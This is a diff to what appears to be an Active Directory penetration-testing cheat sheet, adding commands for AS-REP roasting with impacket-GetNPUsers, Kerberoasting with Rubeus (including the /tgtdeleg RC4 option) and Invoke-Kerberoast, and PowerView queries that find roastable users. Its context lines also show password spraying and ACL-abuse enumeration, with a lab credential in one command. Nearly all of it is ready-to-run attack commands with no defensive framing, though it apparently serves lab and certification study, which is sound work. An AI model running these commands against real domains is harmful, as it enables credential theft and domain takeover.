@@ -637,8 +637,8 @@ Invoke-DomainPasswordSpray -Password Winter2022 -ErrorAction SilentlyContinue
 #### AS-REP
 ```bash
 # impacket
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/user:pass
 impacket-GetNPUsers HTB.local/ -no-pass -dc-ip 10.10.10.161 -usersfile username.txt -format john -outputfile outhash.txt
-impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
 
 # Rubeus
 .\Rubeus.exe asreproast /nowrap /dc:
@@ -651,6 +651,7 @@ impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStro
 # Rubeus
 .\Rubeus.exe kerberoast /stats
 .\Rubeus.exe kerberoast /nowrap /format:hashcat /dc:
+# RC4
 .\Rubeus.exe kerberoast /nowrap /format:hashcat /dc: /tgtdeleg
 ```
 #### DCsync
@@ -768,8 +769,11 @@ Get-NetUser -SPN | select samaccountname,serviceprincipalname
 
 # discription
 Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}
+# AS-REP-roastable
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 # Kerberoastable
 Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname,memberof
+Invoke-Kerberoast
 
 # GenericAll to User
 $geneall = Get-ObjectAcl -Identity "UserName" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
